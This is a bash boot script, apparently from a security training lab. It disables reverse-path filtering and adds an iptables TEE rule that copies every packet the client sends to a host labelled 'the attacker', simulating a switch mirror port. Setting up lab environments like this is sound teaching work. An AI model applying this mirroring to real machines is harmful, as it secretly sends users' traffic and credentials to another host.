#!/bin/bash
# client network preparation (run at boot by lab-net.service).
#  * relaxed reverse-path filtering
#  * traffic mirroring: every packet the client sends on the lab LAN is duplicated to the attacker,
#    as if the attacker was connected to a SPAN port of the lab switch (a virtual switch would
#    otherwise never show it the unicast traffic of other machines).
set -u
ME=10.1.26.11
ATT=10.1.26.10
IFACE=""
for _ in $(seq 1 60); do
    IFACE=$(ip -o -4 addr show | awk -v ip="$ME/" 'index($4, ip)==1 {print $2; exit}')
    [ -n "$IFACE" ] && break
    sleep 2
done
[ -n "$IFACE" ] || { echo "lab-net: lab interface not found" >&2; exit 1; }
sysctl -qw net.ipv4.conf.all.rp_filter=0 net.ipv4.conf.default.rp_filter=0 "net.ipv4.conf.${IFACE}.rp_filter=0"
iptables -t mangle -D POSTROUTING -o "$IFACE" ! -d "$ATT" -j TEE --gateway "$ATT" 2>/dev/null || true
iptables -t mangle -A POSTROUTING -o "$IFACE" ! -d "$ATT" -j TEE --gateway "$ATT"
echo "lab-net: interface $IFACE, mirroring to $ATT enabled"
